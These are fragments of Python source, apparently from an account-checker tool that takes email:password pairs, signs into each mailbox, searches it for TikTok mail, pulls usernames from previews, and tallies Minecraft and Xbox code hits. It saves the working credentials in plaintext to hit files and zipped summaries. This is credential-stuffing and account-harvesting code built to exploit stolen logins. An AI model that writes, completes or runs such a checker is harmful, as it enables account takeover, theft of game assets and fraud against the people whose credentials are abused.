...
def check_tiktok(sess, access_token, cid):
    total, results = _search_mail_with_preview(sess, access_token, cid, "TikTok OR tiktok.com")
    if total > 0:
        username = None
        for result in results[:5]:
            preview = result.get('Preview', '')
            m = re.search(r'@([a-zA-Z0-9_.]{2,24})', preview)
            if m:
                username = m.group(1)
                break
...
class CheckerSession:
    ...
    def process_one(self, email, pwd):
        ...
        # TIKTOK
        try:
            tt_count, tt_user = check_tiktok(sess, access_token, cid)
            if tt_count > 0:
                st.inc("tiktok")
                disp = f"@{tt_user}" if tt_user else str(tt_count)
                st.add("tiktok_list", (email, pwd, disp))
                st.add("all_hits", (email, pwd, "TT", disp))
        except:
            pass
...
def build_result_zip(cs: CheckerSession, user=None):
    ...
    # tiktok_hits.txt
    lines = [f"{em}:{pw} | {n}" for em, pw, n in st.tiktok_list]
    ...
    w("summary.txt", [
        ...
        f"TIKTOK: {st.tiktok} | MINECRAFT: {st.minecraft} | XBOX CODES: {st.xbox_codes}",
...
{E_GAME} {bold('Minecraft:')} {mono(str(st.minecraft))} {E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
...
{E_GAME} Minecraft: {mono(str(st.minecraft))} | Xbox Codes: {mono(str(st.xbox_codes))}
...
{E_GAME} Minecraft: {mono(str(cs.stats.minecraft))} | Xbox Codes: {mono(str(cs.stats.xbox_codes))}
